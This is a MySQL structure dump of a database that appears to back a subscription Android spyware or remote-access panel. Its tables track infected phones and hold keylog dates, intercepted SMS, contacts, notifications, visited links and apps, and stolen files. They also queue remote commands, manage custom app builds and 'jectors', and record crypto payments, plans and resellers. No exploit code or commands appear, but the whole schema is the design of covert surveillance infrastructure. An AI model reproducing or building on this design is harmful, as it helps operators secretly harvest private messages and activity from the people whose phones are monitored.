-- MySQL dump 10.13  Distrib 8.0.41, for Win64 (x86_64)
--
-- Host: localhost    Database: clients
-- ------------------------------------------------------
-- Server version	8.0.41

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `activation_codes`
--

DROP TABLE IF EXISTS `activation_codes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `activation_codes` (
  `id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `activation_code` varchar(255) NOT NULL,
  `status` enum('yes','no') NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `unique_user_id` (`user_id`),
  CONSTRAINT `activation_codes_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=250 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `alerts`
--

DROP TABLE IF EXISTS `alerts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `alerts` (
  `notifi_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `state` int NOT NULL,
  `author` enum('admin','news','clients') NOT NULL,
  `alert_title` text NOT NULL,
  `content` text,
  `alert_ico` longtext,
  `alert_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`notifi_id`),
  UNIQUE KEY `unique_notifi_id` (`notifi_id`),
  UNIQUE KEY `notifi_id` (`notifi_id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `alerts_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `commands`
--

DROP TABLE IF EXISTS `commands`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `commands` (
  `user_id` int NOT NULL,
  `content` text,
  `phone_id` text NOT NULL,
  `commandid` int NOT NULL AUTO_INCREMENT,
  UNIQUE KEY `commandid_2` (`commandid`),
  KEY `user_id` (`user_id`),
  KEY `commandid` (`commandid`),
  CONSTRAINT `cmnd_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `contacts`
--

DROP TABLE IF EXISTS `contacts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `contacts` (
  `cont_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `cont_address` text NOT NULL,
  `cont_name` text NOT NULL,
  `cont_via` text NOT NULL,
  `og_id` text NOT NULL,
  PRIMARY KEY (`cont_id`),
  UNIQUE KEY `unique_cont_id` (`cont_id`),
  UNIQUE KEY `cont_id` (`cont_id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `cont_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `custom_app`
--

DROP TABLE IF EXISTS `custom_app`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `custom_app` (
  `build_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int DEFAULT NULL,
  `app_package` varchar(255) DEFAULT NULL,
  `app_path` varchar(255) DEFAULT NULL,
  `appname` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `app_ico` varchar(255) DEFAULT NULL,
  `build_date` varchar(50) NOT NULL,
  `app_ver` varchar(50) DEFAULT NULL,
  `build_state` enum('onbuild','failed','finished') DEFAULT NULL,
  PRIMARY KEY (`build_id`),
  UNIQUE KEY `cstmappuniq` (`app_package`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `custom_app_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=2533 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `emails`
--

DROP TABLE IF EXISTS `emails`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `emails` (
  `id` int NOT NULL AUTO_INCREMENT,
  `email_to` varchar(255) DEFAULT NULL,
  `email_from` varchar(255) DEFAULT NULL,
  `date` datetime DEFAULT NULL,
  `content` text,
  `ip_address` varchar(45) DEFAULT NULL,
  `user_agent` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `jectors`
--

DROP TABLE IF EXISTS `jectors`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `jectors` (
  `jector_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int DEFAULT NULL,
  `jector_auth` varchar(255) DEFAULT NULL,
  `jector_ip` varchar(45) DEFAULT NULL,
  `temp_key` varchar(32) DEFAULT NULL,
  `user_email` varchar(255) NOT NULL,
  PRIMARY KEY (`jector_id`),
  UNIQUE KEY `user_id_2` (`user_id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `jectors_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=629 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `nodeidfs`
--

DROP TABLE IF EXISTS `nodeidfs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `nodeidfs` (
  `idf` varchar(255) NOT NULL,
  `user_id` int NOT NULL,
  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `ismain` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`idf`),
  UNIQUE KEY `unique_idf` (`idf`),
  UNIQUE KEY `idf` (`idf`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `idf_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `payments`
--

DROP TABLE IF EXISTS `payments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `payments` (
  `paymentid` int NOT NULL AUTO_INCREMENT,
  `userid` int DEFAULT NULL,
  `invoice_id` varchar(50) NOT NULL,
  `crypto` enum('BTC','LTC','DOGE','TRX','USDT') DEFAULT NULL,
  `payment_state` enum('inprogress','success','failed') DEFAULT NULL,
  `payment_amount` decimal(10,2) DEFAULT NULL,
  `payment_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `total_paid` decimal(10,2) DEFAULT NULL,
  `subtype` enum('1 Month','3 Month','12 Month') NOT NULL,
  `additional_information` text,
  `transaction_id` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`paymentid`),
  KEY `userid` (`userid`),
  CONSTRAINT `payments_ibfk_1` FOREIGN KEY (`userid`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=247 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `phone_apps`
--

DROP TABLE IF EXISTS `phone_apps`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `phone_apps` (
  `app_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `app_name` varchar(255) NOT NULL,
  `app_ico` longtext NOT NULL,
  `app_type` varchar(15) NOT NULL,
  `app_pkg` varchar(255) NOT NULL,
  `app_date` varchar(255) NOT NULL,
  `app_permissions` longtext NOT NULL,
  `app_receivers` longtext NOT NULL,
  `app_activitys` longtext NOT NULL,
  `phone_id` varchar(255) NOT NULL,
  PRIMARY KEY (`app_id`),
  UNIQUE KEY `app_id` (`app_id`),
  KEY `idx_apps_id` (`user_id`),
  CONSTRAINT `phone_apps_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=917 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `phone_notifys`
--

DROP TABLE IF EXISTS `phone_notifys`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `phone_notifys` (
  `notifi_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `notifi_time` text NOT NULL,
  `notifi_data` longtext NOT NULL,
  PRIMARY KEY (`notifi_id`),
  UNIQUE KEY `unique_notifi_id` (`notifi_id`),
  UNIQUE KEY `notifi_id` (`notifi_id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `notifi_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=2147483648 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `phoneactivity`
--

DROP TABLE IF EXISTS `phoneactivity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `phoneactivity` (
  `activ_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `activ_time` text NOT NULL,
  `activ_data` longtext NOT NULL,
  PRIMARY KEY (`activ_id`),
  UNIQUE KEY `unique_activ_id` (`activ_id`),
  UNIQUE KEY `activ_id` (`activ_id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `activ_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=815 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `phones`
--

DROP TABLE IF EXISTS `phones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `phones` (
  `phone_id` varchar(255) NOT NULL,
  `user_id` int NOT NULL,
  `phone_name` varchar(20) NOT NULL,
  `country` text NOT NULL,
  `address` text NOT NULL,
  `android_ver` text NOT NULL,
  `model` text NOT NULL,
  `wallpaper` longtext,
  `battery_charg` text NOT NULL,
  `network` text NOT NULL,
  `install_date` text NOT NULL,
  `last_ping` datetime NOT NULL,
  `mob_permissions` text,
  `keylogs_dates` text NOT NULL,
  `visited_links` text NOT NULL,
  `visited_apps` text NOT NULL,
  `notifications` text NOT NULL,
  `activities` text NOT NULL,
  `phone_options` text NOT NULL,
  `session_id` varchar(255) NOT NULL DEFAULT 'empty',
  `Commands` text,
  `isonline` tinyint(1) NOT NULL,
  `isRemoved` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`phone_id`),
  UNIQUE KEY `unique_phone_id` (`phone_id`),
  UNIQUE KEY `phone_id` (`phone_id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `phones_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `resellers`
--

DROP TABLE IF EXISTS `resellers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `resellers` (
  `sellerid` int NOT NULL AUTO_INCREMENT,
  `sellerkey` char(19) NOT NULL,
  `additionalinfo` text,
  PRIMARY KEY (`sellerid`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `sms`
--

DROP TABLE IF EXISTS `sms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sms` (
  `sms_id` int NOT NULL,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `sms_address` text NOT NULL,
  `sms_name` text NOT NULL,
  `sms_date` text NOT NULL,
  `sms_content` longtext,
  `sms_tag` text NOT NULL,
  `sms_type` text NOT NULL,
  PRIMARY KEY (`sms_id`),
  UNIQUE KEY `unique_sms_id` (`sms_id`),
  UNIQUE KEY `sms_id` (`sms_id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `sms_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `storage`
--

DROP TABLE IF EXISTS `storage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `storage` (
  `user_id` int NOT NULL,
  `store_name` varchar(255) DEFAULT NULL,
  `phone_id` text NOT NULL,
  `og_name` varchar(255) NOT NULL,
  `og_type` text NOT NULL,
  `og_size` text NOT NULL,
  `storeid` varchar(32) NOT NULL,
  PRIMARY KEY (`og_name`),
  UNIQUE KEY `storeid_2` (`storeid`),
  UNIQUE KEY `store_name` (`store_name`,`og_name`),
  UNIQUE KEY `store_name_2` (`store_name`,`og_name`),
  KEY `user_id` (`user_id`),
  KEY `storeid` (`storeid`),
  CONSTRAINT `stor_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `store`
--

DROP TABLE IF EXISTS `store`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `store` (
  `app_id` varchar(255) NOT NULL,
  `app_name` varchar(255) DEFAULT NULL,
  `app_size` varchar(50) DEFAULT NULL,
  `app_date` varchar(50) DEFAULT NULL,
  `app_folder` varchar(255) NOT NULL,
  `app_version` varchar(255) NOT NULL,
  `main_activity` varchar(155) NOT NULL,
  `app_ico` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`app_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `store_likes`
--

DROP TABLE IF EXISTS `store_likes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `store_likes` (
  `like_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int DEFAULT NULL,
  `app_id` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`like_id`),
  UNIQUE KEY `user_id` (`user_id`,`app_id`),
  KEY `app_id` (`app_id`),
  CONSTRAINT `store_likes_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`),
  CONSTRAINT `store_likes_ibfk_2` FOREIGN KEY (`app_id`) REFERENCES `store` (`app_id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `suspended`
--

DROP TABLE IF EXISTS `suspended`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `suspended` (
  `id` int NOT NULL AUTO_INCREMENT,
  `address` varchar(255) NOT NULL,
  `suspend_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `extra_info` text,
  `user_agent` varchar(255) NOT NULL,
  `cookie_key` varchar(32) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `user_apps`
--

DROP TABLE IF EXISTS `user_apps`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user_apps` (
  `build_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int DEFAULT NULL,
  `app_package` varchar(255) DEFAULT NULL,
  `app_path` varchar(255) DEFAULT NULL,
  `build_date` varchar(50) NOT NULL,
  `app_ver` varchar(50) DEFAULT NULL,
  `build_state` enum('onbuild','failed','finished') DEFAULT NULL,
  PRIMARY KEY (`build_id`),
  UNIQUE KEY `usrappuniq` (`app_package`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `user_apps_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`),
  CONSTRAINT `user_apps_ibfk_2` FOREIGN KEY (`app_package`) REFERENCES `store` (`app_id`)
) ENGINE=InnoDB AUTO_INCREMENT=137 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `userid` int NOT NULL AUTO_INCREMENT,
  `usrname` varchar(8) DEFAULT NULL,
  `profilepic` text NOT NULL,
  `email` varchar(255) NOT NULL,
  `password` text NOT NULL,
  `otp_salt` text,
  `Expire` date DEFAULT NULL,
  `subtype` enum('1 Month','3 Month','12 Month','new') NOT NULL DEFAULT 'new',
  `token` text CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci,
  `token_expiration` datetime DEFAULT NULL,
  `authorty` enum('admin','news','clients') NOT NULL,
  `hwid` varchar(255) DEFAULT NULL,
  `suspicious` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `admin_key` varchar(19) NOT NULL,
  PRIMARY KEY (`userid`),
  UNIQUE KEY `userid` (`userid`),
  UNIQUE KEY `email` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=998535 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `users_info`
--

DROP TABLE IF EXISTS `users_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users_info` (
  `info_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `co_code` text NOT NULL,
  `country` text NOT NULL,
  `ip` varchar(45) NOT NULL,
  `user_agent` varchar(255) NOT NULL,
  `post_check` varchar(32) DEFAULT NULL,
  PRIMARY KEY (`info_id`),
  UNIQUE KEY `user_id` (`user_id`),
  KEY `idx_user_id` (`user_id`),
  CONSTRAINT `users_info_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=3006 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `visitedapps`
--

DROP TABLE IF EXISTS `visitedapps`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `visitedapps` (
  `vapp_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `vapp_time` text NOT NULL,
  `vapp_data` longtext NOT NULL,
  PRIMARY KEY (`vapp_id`),
  UNIQUE KEY `unique_vapp_id` (`vapp_id`),
  UNIQUE KEY `vapp_id` (`vapp_id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `vapp_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `visitedlinks`
--

DROP TABLE IF EXISTS `visitedlinks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `visitedlinks` (
  `vlink_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `phone_id` text NOT NULL,
  `vlink_time` text NOT NULL,
  `vlink_data` longtext NOT NULL,
  PRIMARY KEY (`vlink_id`),
  UNIQUE KEY `unique_vlink_id` (`vlink_id`),
  UNIQUE KEY `vlink_id` (`vlink_id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `vlink_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`userid`)
) ENGINE=InnoDB AUTO_INCREMENT=815 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-05-29  5:05:18
